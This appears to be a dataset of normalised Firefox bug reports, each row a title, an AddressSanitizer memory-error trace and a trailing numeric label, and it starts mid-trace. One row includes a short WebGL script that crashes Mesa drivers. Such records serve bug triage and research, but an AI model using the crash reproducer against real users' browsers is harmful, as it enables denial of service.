unsigned int src/layout/generic/nstextframethebes.cpp:549 7 in buildtextrunsscanner buildtextrunforframes void src/layout/generic/nstextframethebes.cpp:2025 8 in buildtextrunsscanner flushframes bool bool src/layout/generic/nstextframethebes.cpp:1388 9 in buildtextrunsscanner scanframe nsiframe src/layout/generic/nstextframethebes.cpp:1578 10 in buildtextrunsscanner scanframe nsiframe src/layout/generic/nstextframethebes.cpp:1618 11 in buildtextrunsscanner scanframe nsiframe src/layout/generic/nstextframethebes.cpp:1618 12 in buildtextrunsscanner scanframe nsiframe src/layout/generic/nstextframethebes.cpp:1618 13 in buildtextruns gfxcontext nstextframe nsiframe nslinelist_iterator const nstextframe textruntype src/layout/generic/nstextframethebes.cpp:1291 14 in nstextframe ensuretextrun nstextframe textruntype gfxcontext nsiframe nslinelist_iterator const unsigned int src/layout/generic/nstextframethebes.cpp:2441 15 in nstextframe reflowtext nslinelayout int nsrenderingcontext bool nshtmlreflowmetrics unsigned int src/layout/generic/nstextframethebes.cpp:7705 16 in nslinelayout reflowframe nsiframe unsigned int nshtmlreflowmetrics bool src/layout/generic/nslinelayout.cpp:829 17 in nsinlineframe reflowinlineframe nsprescontext nshtmlreflowstate const nsinlineframe inlinereflowstate nsiframe unsigned int src/layout/generic/nsinlineframe.cpp:680 18 in nsinlineframe reflowframes nsprescontext nshtmlreflowstate const nsinlineframe inlinereflowstate nshtmlreflowmetrics unsigned int src/layout/generic/nsinlineframe.cpp:543 19 in nsinlineframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsinlineframe.cpp:397 20 in nslinelayout reflowframe nsiframe unsigned int nshtmlreflowmetrics bool src/layout/generic/nslinelayout.cpp:822 21 in nsinlineframe reflowinlineframe nsprescontext nshtmlreflowstate const nsinlineframe inlinereflowstate nsiframe unsigned int src/layout/generic/nsinlineframe.cpp:680 22 in nsinlineframe reflowframes nsprescontext nshtmlreflowstate const nsinlineframe inlinereflowstate nshtmlreflowmetrics unsigned int src/layout/generic/nsinlineframe.cpp:543 23 in nsinlineframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsinlineframe.cpp:397 24 in nslinelayout reflowframe nsiframe unsigned int nshtmlreflowmetrics bool src/layout/generic/nslinelayout.cpp:822 shadow byte and word fa fa fa fa fa fa fa fa fa more shadow bytes fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 03 fb fb fb fb fb fb fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa stats 225m malloced 237m for red zones by 356222 calls stats 41m realloced by 20031 calls stats 195m freed by 233151 calls stats 61m really freed by 153616 calls stats 428m 109644 full pages mmaped in 107 calls mmaps by size class 8:245745 9:40955 10:16380 11:14329 12:2048 13:1536 14:1280 15:256 16:448 17:1248 18:144 19:40 20:16 mallocs by size class 8:270186 9:45811 10:15863 11:16411 12:2410 13:1791 14:1427 15:303 16:504 17:1289 18:170 19:41 20:16 frees by size class 8:163811 9:36853 10:12738 11:13321 12:1546 13:1490 14:1240 15:259 16:449 17:1277 18:115 19:39 20:13 rfrees by size class 8:115976 9:19137 10:7708 11:8747 12:536 13:469 14:336 15:146 16:338 17:189 18:28 19:5 20:1 stats malloc large 1516 small slow 1815 12169 aborting	11
heap-use-after-free in nshtmlcssutils createcsspropertytxn reproduces on trunk 5528 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in nshtmlcssutils createcsspropertytxn nsidomelement nsiatom nsastring_internal const changecssinlinestyletxn bool src/editor/libeditor/html/nshtmlcssutils.cpp:569 1 in nshtmlcssutils setcssproperty nsidomelement nsiatom nsastring_internal const bool src/editor/libeditor/html/nshtmlcssutils.cpp:512 2 in nshtmlcssutils setcssequivalenttohtmlstyle nsidomnode nsiatom nsastring_internal const nsastring_internal const int bool src/editor/libeditor/html/nshtmlcssutils.cpp:1012 3 in nshtmleditor setattributeorequivalent nsidomelement nsastring_internal const nsastring_internal const bool src/editor/libeditor/html/nshtmleditor.cpp:4560 4 in nshtmleditrules alignblock nsidomelement nsastring_internal const bool src/editor/libeditor/html/nshtmleditrules.cpp:8465 5 in nshtmleditrules willalign mozilla selection nsastring_internal const bool bool src/editor/libeditor/html/nshtmleditrules.cpp:4547 6 in nshtmleditrules willdoaction mozilla selection nsrulesinfo bool bool src/editor/libeditor/html/nshtmleditrules.cpp:609 7 in nshtmleditor align nsastring_internal const src/editor/libeditor/html/nshtmleditor.cpp:2258 8 in non-virtual thunk to nshtmleditor align nsastring_internal const src/build/unix/stdc++compat/stdc++compat.cpp:0 9 in nsaligncommand setstate nsieditor nsstring src/editor/composer/src/nscomposercommands.cpp:971 10 in nsmultistatecommand docommandparams char const nsicommandparams nsisupports src/editor/composer/src/nscomposercommands.cpp:600 11 in nscontrollercommandtable docommandparams char const nsicommandparams nsisupports src/embedding/components/commandhandler/src/nscontrollercommandtable.cpp:175 12 in nsbasecommandcontroller docommandwithparams char const nsicommandparams src/embedding/components/commandhandler/src/nsbasecommandcontroller.cpp:153 13 in non-virtual thunk to nsbasecommandcontroller docommandwithparams char const nsicommandparams src/build/unix/stdc++compat/stdc++compat.cpp:0 14 in nscommandmanager docommand char const nsicommandparams nsidomwindow src/embedding/components/commandhandler/src/nscommandmanager.cpp:234 15 in nshtmldocument execcommand nsastring_internal const bool nsastring_internal const bool src/content/html/document/src/nshtmldocument.cpp:3232 16 in non-virtual thunk to nshtmldocument execcommand nsastring_internal const bool nsastring_internal const bool src/build/unix/stdc++compat/stdc++compat.cpp:0 17 in ns_invokebyindex_p src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 18 in callmethodhelper invoke src/js/xpconnect/src/xpcwrappednative.cpp:3117 19 in xpc_wn_callmethod jscontext unsigned int js value src/js/xpconnect/src/xpcwrappednativejsops.cpp:1480 20 in js calljsnative jscontext int jscontext unsigned int js value js callargs const src/js/src/jscntxtinlines.h:389 21 in js interpret jscontext js stackframe js interpmode src/js/src/jsinterp.cpp:2413 22 in js runscript jscontext jsscript js stackframe src/js/src/jsinterp.cpp:309 23 in js executekernel jscontext js handle jsscript jsobject js value const js executetype js stackframe js value src/js/src/jsinterp.cpp:494 24 in js execute jscontext js handle jsscript jsobject js value src/js/src/jsinterp.cpp:531 25 in js evaluate jscontext js handle jsobject js compileoptions unsigned short const unsigned long js value src/js/src/jsapi.cpp:5723 26 in js_evaluateucscriptforprincipalsversionorigin src/js/src/jsapi.cpp:5804 27 in nsjscontext evaluatestring nsastring_internal const jsobject nsiprincipal nsiprincipal char const unsigned int jsversion nsastring_internal bool src/dom/base/nsjsenvironment.cpp:1506 28 in nsglobalwindow runtimeouthandler nstimeout nsiscriptcontext src/dom/base/nsglobalwindow.cpp:9609 29 in nsglobalwindow runtimeout nstimeout src/dom/base/nsglobalwindow.cpp:9870 30 in nsglobalwindow timercallback nsitimer void src/dom/base/nsglobalwindow.cpp:10137 31 in nstimerimpl fire src/xpcom/threads/nstimerimpl.cpp:473 32 in nstimerevent run src/xpcom/threads/nstimerimpl.cpp:556 33 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:624 34 in ns_processnextevent_p nsithread bool src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:220 35 in nsxulwindow showmodal src/xpfe/appshell/src/nsxulwindow.cpp:379 36 in nscontenttreeowner showasmodal src/xpfe/appshell/src/nscontenttreeowner.cpp:529 37 in non-virtual thunk to nscontenttreeowner showasmodal src/build/unix/stdc++compat/stdc++compat.cpp:0 38 in nswindowwatcher openwindowinternal nsidomwindow char const char const char const bool bool bool nsiarray nsidomwindow src/embedding/components/windowwatcher/src/nswindowwatcher.cpp:1033 39 in nswindowwatcher openwindow nsidomwindow char const char const char const nsisupports nsidomwindow src/embedding/components/windowwatcher/src/nswindowwatcher.cpp:399 40 in ns_invokebyindex_p src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 41 in callmethodhelper invoke src/js/xpconnect/src/xpcwrappednative.cpp:3117 42 in xpc_wn_callmethod jscontext unsigned int js value src/js/xpconnect/src/xpcwrappednativejsops.cpp:1480 43 in js calljsnative jscontext int jscontext unsigned int js value js callargs const src/js/src/jscntxtinlines.h:389 44 in js interpret jscontext js stackframe js interpmode src/js/src/jsinterp.cpp:2413 45 in js runscript jscontext jsscript js stackframe src/js/src/jsinterp.cpp:309 46 in js invokekernel jscontext js callargs js maybeconstruct src/js/src/jsinterp.cpp:363 47 in js invoke jscontext js invokeargsguard js maybeconstruct src/js/src/jsinterp.h:119 48 in js invoke jscontext js value const js value const unsigned int js value js value src/js/src/jsinterp.cpp:396 49 in js_callfunctionvalue src/js/src/jsapi.cpp:5904 50 in nsxpcwrappedjsclass callmethod nsxpcwrappedjs unsigned short xptmethoddescriptor const nsxptcminivariant src/js/xpconnect/src/xpcwrappedjsclass.cpp:1436 51 in nsxpcwrappedjs callmethod unsigned short xptmethoddescriptor const nsxptcminivariant src/js/xpconnect/src/xpcwrappedjs.cpp:580 52 in prepareanddispatch src/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:121 53 in sharedstub src/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:0 54 in ns_invokebyindex_p src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 55 in callmethodhelper invoke src/js/xpconnect/src/xpcwrappednative.cpp:3117 56 in xpc_wn_callmethod jscontext unsigned int js value src/js/xpconnect/src/xpcwrappednativejsops.cpp:1480 57 in js calljsnative jscontext int jscontext unsigned int js value js callargs const src/js/src/jscntxtinlines.h:389 58 in js interpret jscontext js stackframe js interpmode src/js/src/jsinterp.cpp:2413 59 in js runscript jscontext jsscript js stackframe src/js/src/jsinterp.cpp:309 60 in js invokekernel jscontext js callargs js maybeconstruct src/js/src/jsinterp.cpp:363 61 in js invoke jscontext js invokeargsguard js maybeconstruct src/js/src/jsinterp.h:119 62 in js callorconstructboundfunction jscontext unsigned int js value src/js/src/jsfun.cpp:1029 63 in js calljsnative jscontext int jscontext unsigned int js value js callargs const src/js/src/jscntxtinlines.h:389 is located 0 bytes inside of 16-byte region freed by thread t0 here 0 in free 0 1 in moz_free src/memory/mozalloc/mozalloc.cpp:51 2 in operator delete void src dist/include/mozilla/mozalloc.h:224 3 in nsautoptr nshtmlcssutils operator nshtmlcssutils src dist/include/nsautoptr.h:101 4 in nshtmleditor init nsidomdocument nsicontent nsiselectioncontroller unsigned int src/editor/libeditor/html/nshtmleditor.cpp:249 5 in nseditingsession setupeditoronwindow nsidomwindow src/editor/composer/src/nseditingsession.cpp:460 6 in nseditingsession makewindoweditable nsidomwindow char const bool bool bool src/editor/composer/src/nseditingsession.cpp:173 7 in nshtmldocument editingstatechanged src/content/html/document/src/nshtmldocument.cpp:2693 8 in nshtmldocument beginload src/content/html/document/src/nshtmldocument.cpp:880 9 in nshtml5treeopexecutor willbuildmodel nsdtdmode src/parser/html/nshtml5treeopexecutor.cpp:116 10 in nshtml5parser parse nsastring_internal const void nsacstring_internal const bool nsdtdmode src/parser/html/nshtml5parser.cpp:231 11 in nshtmldocument close src/content/html/document/src/nshtmldocument.cpp:1606 12 in non-virtual thunk to nshtmldocument close src/build/unix/stdc++compat/stdc++compat.cpp:0 13 in ns_invokebyindex_p src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 14 in callmethodhelper invoke src/js/xpconnect/src/xpcwrappednative.cpp:3117 15 in xpc_wn_callmethod jscontext unsigned int js value src/js/xpconnect/src/xpcwrappednativejsops.cpp:1480 16 in js calljsnative jscontext int jscontext unsigned int js value js callargs const src/js/src/jscntxtinlines.h:389 17 in js invoke jscontext js invokeargsguard js maybeconstruct src/js/src/jsinterp.h:119 18 in js invoke jscontext js value const js value const unsigned int js value js value src/js/src/jsinterp.cpp:396 19 in js indirectproxyhandler call jscontext jsobject unsigned int js value src/js/src/jsproxy.cpp:477 20 in js directwrapper call jscontext jsobject unsigned int js value src/js/src/jswrapper.cpp:318 21 in js crosscompartmentwrapper call jscontext jsobject unsigned int js value src/js/src/jswrapper.cpp:731 22 in non-virtual thunk to js crosscompartmentwrapper call jscontext jsobject unsigned int js value 0 23 in js proxy call jscontext jsobject unsigned int js value src/js/src/jsproxy.cpp:1320 24 in proxy_call jscontext unsigned int js value src/js/src/jsproxy.cpp:1856 25 in js calljsnative jscontext int jscontext unsigned int js value js callargs const src/js/src/jscntxtinlines.h:389 26 in js interpret jscontext js stackframe js interpmode src/js/src/jsinterp.cpp:2413 27 in js runscript jscontext jsscript js stackframe src/js/src/jsinterp.cpp:309 28 in js invokekernel jscontext js callargs js maybeconstruct src/js/src/jsinterp.cpp:363 29 in js invoke jscontext js invokeargsguard js maybeconstruct src/js/src/jsinterp.h:119 previously allocated by thread t0 here 0 in interceptor_malloc 0 1 in moz_xmalloc src/memory/mozalloc/mozalloc.cpp:57 2 in operator new unsigned long src dist/include/mozilla/mozalloc.h:200 3 in nseditingsession setupeditoronwindow nsidomwindow src/editor/composer/src/nseditingsession.cpp:460 4 in nseditingsession makewindoweditable nsidomwindow char const bool bool bool src/editor/composer/src/nseditingsession.cpp:173 5 in nshtmldocument editingstatechanged src/content/html/document/src/nshtmldocument.cpp:2693 6 in nshtmldocument setdesignmode nsastring_internal const src/content/html/document/src/nshtmldocument.cpp:2834 7 in nsidomhtmldocument_setdesignmode jscontext js handle jsobject js handle long int js mutablehandle js value src/objdir-ff-asan-sym/js/xpconnect/src/dom_quickstubs.cpp:13862 8 in js calljspropertyopsetter jscontext int jscontext js handle jsobject js handle long int js mutablehandle js value js handle jsobject js handle long int js mutablehandle js value src/js/src/jscntxtinlines.h:469 9 in js baseops setpropertyhelper jscontext js handle jsobject js handle jsobject js handle long unsigned int js mutablehandle js value int src/js/src/jsobj.cpp:4853 10 in js setpropertyoperation jscontext unsigned char js handle js value js handle js value src/js/src/jsinterpinlines.h:345 11 in js interpret jscontext js stackframe js interpmode src/js/src/jsinterp.cpp:2323 12 in js runscript jscontext jsscript js stackframe src/js/src/jsinterp.cpp:309 13 in js executekernel jscontext js handle jsscript jsobject js value const js executetype js stackframe js value src/js/src/jsinterp.cpp:494 14 in js execute jscontext js handle jsscript jsobject js value src/js/src/jsinterp.cpp:531 15 in js evaluate jscontext js handle jsobject js compileoptions unsigned short const unsigned long js value src/js/src/jsapi.cpp:5723 16 in js_evaluateucscriptforprincipalsversionorigin src/js/src/jsapi.cpp:5804 17 in nsjscontext evaluatestring nsastring_internal const jsobject nsiprincipal nsiprincipal char const unsigned int jsversion nsastring_internal bool src/dom/base/nsjsenvironment.cpp:1506 18 in nsglobalwindow runtimeouthandler nstimeout nsiscriptcontext src/dom/base/nsglobalwindow.cpp:9609 19 in nsglobalwindow runtimeout nstimeout src/dom/base/nsglobalwindow.cpp:9870 20 in nsglobalwindow timercallback nsitimer void src/dom/base/nsglobalwindow.cpp:10137 21 in nstimerimpl fire src/xpcom/threads/nstimerimpl.cpp:473 22 in nstimerevent run src/xpcom/threads/nstimerimpl.cpp:556 23 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:624 24 in ns_processnextevent_p nsithread bool src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:220 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes 00 00 00 fb fb fb fb fb fb fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 02 fb fb fb fb fb fb fb stats 235m malloced 268m for red zones by 475854 calls stats 41m realloced by 21216 calls stats 202m freed by 245094 calls stats 69m really freed by 155750 calls stats 440m 112717 full pages mmaped in 110 calls mmaps by size class 8:278511 9:40955 10:16380 11:14329 12:3072 13:1536 14:1280 15:256 16:448 17:1248 18:144 19:40 20:16 mallocs by size class 8:385323 9:48551 10:16749 11:16755 12:2604 13:1970 14:1504 15:316 16:520 17:1336 18:168 19:42 20:16 frees by size class 8:172072 9:39112 10:13415 11:13609 12:1698 13:1660 14:1305 15:271 16:462 17:1323 18:115 19:39 20:13 rfrees by size class 8:116704 9:19801 10:7916 11:9035 12:580 13:511 14:395 15:147 16:339 17:288 18:28 19:5 20:1 stats malloc large 1562 small slow 2104 5528 aborting	9
heap-buffer-overflow in nshtmleditor isprevcharinnodewhitespace reproduces on trunk 20120825191419 30534 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 1 at thread t0 0 in nstextfragment charat int const src/layout/base content/base/src/nstextfragment.h:178 1 in nshtmleditor isprevcharinnodewhitespace nsicontent int bool bool nsicontent int src/editor/libeditor/html/nshtmleditor.cpp:901 2 in nshtmleditrules getpromotedpoint nshtmleditrules rulesendpoint nsidomnode int editaction nscomptr nsidomnode int src/editor/libeditor/html/nshtmleditrules.cpp:5240 3 in nshtmleditrules promoterange nsidomrange editaction src/editor/libeditor/html/nshtmleditrules.cpp:5492 4 in nshtmleditrules aftereditinner editaction short src/editor/libeditor/html/nshtmleditrules.cpp:430 5 in nshtmleditrules afteredit editaction short src/editor/libeditor/html/nshtmleditrules.cpp:376 6 in nshtmleditor endoperation src/editor/libeditor/html/nshtmleditor.cpp:3513 7 in nsautorules src/editor/libeditor/base/nseditorutils.h:95 8 in nsautorules src/editor/libeditor/base/nseditorutils.h:92 9 in nsplaintexteditor inserttext nsastring_internal const src/editor/libeditor/text/nsplaintexteditor.cpp:728 10 in non-virtual thunk to nsplaintexteditor inserttext nsastring_internal const src/build/unix/stdc++compat/stdc++compat.cpp:0 11 in nsinsertplaintextcommand docommandparams char const nsicommandparams nsisupports src/editor/libeditor/base/nseditorcommands.cpp:846 12 in nscontrollercommandtable docommandparams char const nsicommandparams nsisupports src/embedding/components/commandhandler/src/nscontrollercommandtable.cpp:175 13 in nsbasecommandcontroller docommandwithparams char const nsicommandparams src/embedding/components/commandhandler/src/nsbasecommandcontroller.cpp:153 14 in non-virtual thunk to nsbasecommandcontroller docommandwithparams char const nsicommandparams src/build/unix/stdc++compat/stdc++compat.cpp:0 15 in nscommandmanager docommand char const nsicommandparams nsidomwindow src/embedding/components/commandhandler/src/nscommandmanager.cpp:234 16 in nshtmldocument execcommand nsastring_internal const bool nsastring_internal const bool src/content/html/document/src/nshtmldocument.cpp:3232 17 in non-virtual thunk to nshtmldocument execcommand nsastring_internal const bool nsastring_internal const bool src/build/unix/stdc++compat/stdc++compat.cpp:0 18 in ns_invokebyindex_p src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 19 in callmethodhelper invoke src/js/xpconnect/src/xpcwrappednative.cpp:3106 20 in xpc_wn_callmethod jscontext unsigned int js value src/js/xpconnect/src/xpcwrappednativejsops.cpp:1478 21 in js calljsnative jscontext int jscontext unsigned int js value js callargs const src/js/src/jscntxtinlines.h:372 22 in js interpret jscontext js stackframe js interpmode src/js/src/jsinterp.cpp:2413 23 in js runscript jscontext jsscript js stackframe src/js/src/jsinterp.cpp:309 24 in js executekernel jscontext js handle jsscript jsobject js value const js executetype js stackframe js value src/js/src/jsinterp.cpp:494 25 in js execute jscontext js handle jsscript jsobject js value src/js/src/jsinterp.cpp:531 26 in js evaluate jscontext js handle jsobject js compileoptions unsigned short const unsigned long js value src/js/src/jsapi.cpp:5665 27 in js_evaluateucscriptforprincipalsversionorigin src/js/src/jsapi.cpp:5746 28 in nsjscontext evaluatestring nsastring_internal const jsobject nsiprincipal nsiprincipal char const unsigned int jsversion nsastring_internal bool src/dom/base/nsjsenvironment.cpp:1497 29 in nsglobalwindow runtimeouthandler nstimeout nsiscriptcontext src/dom/base/nsglobalwindow.cpp:9590 30 in nsglobalwindow runtimeout nstimeout src/dom/base/nsglobalwindow.cpp:9851 31 in nsglobalwindow timercallback nsitimer void src/dom/base/nsglobalwindow.cpp:10118 32 in nstimerimpl fire src/xpcom/threads/nstimerimpl.cpp:473 33 in nstimerevent run src/xpcom/threads/nstimerimpl.cpp:556 34 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:625 35 in ns_processnextevent_p nsithread bool src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:220 36 in mozilla ipc messagepump run base messagepump delegate src/ipc/glue/messagepump.cpp:82 37 in messageloop runinternal src/ipc/chromium/src/base/message_loop.cc:208 38 in messageloop runhandler src/ipc/chromium/src/base/message_loop.cc:201 39 in messageloop run src/ipc/chromium/src/base/message_loop.cc:175 40 in nsbaseappshell run src/widget/xpwidgets/nsbaseappshell.cpp:163 41 in nsappstartup run src/toolkit/components/startup/nsappstartup.cpp:273 42 in xremain xre_mainrun src/toolkit/xre/nsapprunner.cpp:3800 43 in xremain xre_main int char nsxreappdata const src/toolkit/xre/nsapprunner.cpp:3877 44 in xre_main src/toolkit/xre/nsapprunner.cpp:3953 45 in do_main int char src/browser/app/nsbrowserapp.cpp:174 46 in main src/browser/app/nsbrowserapp.cpp:279 47 in 0 is located 0 bytes to the right of 1053-byte region allocated by thread t0 here 0 in interceptor_malloc 0 1 in moz_xmalloc src/memory/mozalloc/mozalloc.cpp:57 2 in ns_alloc_p src/xpcom/base/nsmemoryimpl.cpp:163 3 in nsmemory alloc unsigned long src dist/include/nsmemory.h:36 4 in nstextfragment setto unsigned short const int bool src/content/base/src/nstextfragment.cpp:264 5 in nsgenericdomdatanode settextinternal unsigned int unsigned int unsigned short const unsigned int bool characterdatachangeinfo details src/content/base/src/nsgenericdomdatanode.cpp:307 6 in nsgenericdomdatanode settext unsigned short const unsigned int bool src/content/base/src/nsgenericdomdatanode.cpp:850 7 in nsicontent settext nsastring_internal const bool src dist/include/nsicontent.h:513 8 in compresswhitespace nsicontent src/layout/mathml/nsmathmltokenframe.cpp:98 9 in nsmathmltokenframe init nsicontent nsiframe nsiframe src/layout/mathml/nsmathmltokenframe.cpp:111 10 in nscssframeconstructor initandrestoreframe nsframeconstructorstate const nsicontent nsiframe nsiframe nsiframe bool src/layout/base/nscssframeconstructor.cpp:4545 11 in nscssframeconstructor constructframefromiteminternal nscssframeconstructor frameconstructionitem nsframeconstructorstate nsiframe nsframeitems src/layout/base/nscssframeconstructor.cpp:3647 12 in nscssframeconstructor constructframesfromitem nsframeconstructorstate nscssframeconstructor frameconstructionitemlist iterator nsiframe nsframeitems src/layout/base/nscssframeconstructor.cpp:5551 13 in nscssframeconstructor constructframesfromitemlist nsframeconstructorstate nscssframeconstructor frameconstructionitemlist nsiframe nsframeitems src/layout/base/nscssframeconstructor.cpp:9817 14 in nscssframeconstructor processchildren nsframeconstructorstate nsicontent nsstylecontext nsiframe bool nsframeitems bool pendingbinding nsiframe src/layout/base/nscssframeconstructor.cpp:9961 15 in nscssframeconstructor constructblock nsframeconstructorstate nsstyledisplay const nsicontent nsiframe nsiframe nsstylecontext nsiframe nsframeitems bool pendingbinding src/layout/base/nscssframeconstructor.cpp:11008 16 in nscssframeconstructor constructnonscrollableblock nsframeconstructorstate nscssframeconstructor frameconstructionitem nsiframe nsstyledisplay const nsframeitems nsiframe src/layout/base/nscssframeconstructor.cpp:4522 17 in nscssframeconstructor constructframefromiteminternal nscssframeconstructor frameconstructionitem nsframeconstructorstate nsiframe nsframeitems src/layout/base/nscssframeconstructor.cpp:3611 18 in nscssframeconstructor constructframesfromitem nsframeconstructorstate nscssframeconstructor frameconstructionitemlist iterator nsiframe nsframeitems src/layout/base/nscssframeconstructor.cpp:5551 19 in nscssframeconstructor constructframesfromitemlist nsframeconstructorstate nscssframeconstructor frameconstructionitemlist nsiframe nsframeitems src/layout/base/nscssframeconstructor.cpp:9817 20 in nscssframeconstructor contentrangeinserted nsicontent nsicontent nsicontent nsilayouthistorystate bool src/layout/base/nscssframeconstructor.cpp:7218 21 in nscssframeconstructor contentinserted nsicontent nsicontent nsilayouthistorystate bool src/layout/base/nscssframeconstructor.cpp:6837 22 in nscssframeconstructor recreateframesforcontent nsicontent bool src/layout/base/nscssframeconstructor.cpp:9341 23 in nscssframeconstructor processrestyledframes nsstylechangelist src/layout/base/nscssframeconstructor.cpp:8084 24 in mozilla css restyletracker processonerestyle mozilla dom element nsrestylehint nschangehint src/layout/base/restyletracker.cpp:132 shadow byte and word 5 00 00 00 05 fb fb fb fb more shadow bytes 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 05 fb fb fb fb fb fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa stats 238m malloced 274m for red zones by 500040 calls stats 42m realloced by 21762 calls stats 203m freed by 265667 calls stats 71m really freed by 156628 calls stats 448m 114766 full pages mmaped in 112 calls mmaps by size class 8:294894 9:40955 10:16380 11:14329 12:3072 13:1536 14:1280 15:256 16:448 17:1248 18:160 19:40 20:16 mallocs by size class 8:406418 9:50541 10:17092 11:17141 12:2998 13:1978 14:1488 15:324 16:525 17:1297 18:179 19:42 20:17 frees by size class 8:189390 9:41298 10:13781 11:13967 12:2077 13:1668 14:1286 15:282 16:466 17:1284 18:115 19:39 20:14 rfrees by size class 8:117290 9:19910 10:7974 11:9114 12:582 13:521 14:398 15:147 16:339 17:319 18:28 19:5 20:1 stats malloc large 1535 small slow 2173 30534 aborting	11
mesa crashes on certain teximage2d calls involving level 0 html head script var gl document.createelement canvas getcontext experimental-webgl var texture gl.createtexture gl.bindtexture gl.texture_2d texture gl.teximage2d gl.texture_2d 6 gl.rgba 512 2 0 gl.rgba gl.unsigned_byte null gl.deletetexture texture script head html crashes on linux with mesa like 32234 error addresssanitizer crashed on unknown address pc sp bp t0 addresssanitizer can not provide additional info aborting 0 in 0 also crashes chrome	9
global-buffer-overflow in nschartraits length tested with build from choller/firefox/asan/20120826-mozilla-central-linux64-debug-b3cce81fef1a+asan.html asan-report from the original repro-file assertion decoder returned an error but filled the output buffer should not happen 0 capacity haveread file builds/slave/try-lnx64-dbg/build/netwerk/base/src/nsunicharstreamloader.cpp line 225 1146 error addresssanitizer global-buffer-overflow on address at pc bp sp read of size 2 at thread t0 0 in nschartraits unsigned short length unsigned short const builds/slave/try-lnx64-dbg/build dist/include/nschartraits.h:345 1 in nsastring_internal assign unsigned short const unsigned int mozilla fallible_t const builds/slave/try-lnx64-dbg/build/xpcom/string/src/nstsubstring.cpp:304 2 in nsastring_internal assign unsigned short const unsigned int builds/slave/try-lnx64-dbg/build/xpcom/string/src/nstsubstring.cpp:290 3 in nsstring operator unsigned short const builds/slave/try-lnx64-dbg/build dist/include/nststring.h:65 4 in nsdocshell settitle unsigned short const builds/slave/try-lnx64-dbg/build/docshell/base/nsdocshell.cpp:5236 5 in non-virtual thunk to nsdocshell settitle unsigned short const builds/slave/try-lnx64-dbg/build/media/libvpx/vp8/encoder/x86/quantize_mmx.asm:0 6 in nsdocument donotifypossibletitlechange builds/slave/try-lnx64-dbg/build/content/base/src/nsdocument.cpp:5288 7 in nsrunnablemethodimpl void nsdocument false run builds/slave/try-lnx64-dbg/build dist/include/nsthreadutils.h:349 8 in nsthread processnextevent bool bool builds/slave/try-lnx64-dbg/build/xpcom/threads/nsthread.cpp:624 9 in ns_processnextevent_p nsithread bool builds/slave/try-lnx64-dbg/build/obj-firefox/xpcom/build/nsthreadutils.cpp:220 10 in mozilla ipc messagepump run base messagepump delegate builds/slave/try-lnx64-dbg/build/ipc/glue/messagepump.cpp:82 11 in messageloop runinternal builds/slave/try-lnx64-dbg/build/ipc/chromium/src/base/message_loop.cc:209 12 in messageloop run builds/slave/try-lnx64-dbg/build/ipc/chromium/src/base/message_loop.cc:176 13 in nsbaseappshell run builds/slave/try-lnx64-dbg/build/widget/xpwidgets/nsbaseappshell.cpp:165 14 in nsappstartup run builds/slave/try-lnx64-dbg/build/toolkit/components/startup/nsappstartup.cpp:273 15 in xremain xre_mainrun builds/slave/try-lnx64-dbg/build/toolkit/xre/nsapprunner.cpp:3800 16 in xremain xre_main int char nsxreappdata const builds/slave/try-lnx64-dbg/build/toolkit/xre/nsapprunner.cpp:3877 17 in xre_main builds/slave/try-lnx64-dbg/build/toolkit/xre/nsapprunner.cpp:3953 18 in do_main int char builds/slave/try-lnx64-dbg/build/browser/app/nsbrowserapp.cpp:174 19 in main builds/slave/try-lnx64-dbg/build/browser/app/nsbrowserapp.cpp:279 20 in libc_start_main build/buildd/eglibc-2.15/csu/libc-start.c:258 is located 0 bytes to the right of global variable gnullchar builds/slave/try-lnx64-dbg/build/xpcom/string/src/nssubstring.cpp of size 2 1146 aborting stats 235m malloced 239m for red zones by 324882 calls stats 30m realloced by 21484 calls stats 202m freed by 199576 calls stats 68m really freed by 103398 calls stats 436m 111696 full pages mmaped in 109 calls mmaps by size class 8:196596 9:32764 10:20475 11:16376 12:3072 13:1536 14:1280 15:256 16:448 17:1248 18:192 19:40 20:16 mallocs by size class 8:236195 9:35940 10:24728 11:19418 12:2929 13:1796 14:1466 15:270 16:632 17:1255 18:195 19:44 20:14 frees by size class 8:131552 9:24822 10:20131 11:16183 12:1854 13:1549 14:1301 15:227 16:520 17:1244 18:140 19:41 20:12 rfrees by size class 8:69590 9:9871 10:11815 11:9747 12:640 13:470 14:487 15:107 16:301 17:358 18:6 19:5 20:1 stats malloc large 1508 small slow 1931 shadow byte and word 2 02 f9 f9 f9 f9 f9 f9 f9 more shadow bytes 00 00 f9 f9 f9 f9 f9 f9 00 f9 f9 f9 f9 f9 f9 f9 00 00 f9 f9 f9 f9 f9 f9 00 f9 f9 f9 f9 f9 f9 f9 02 f9 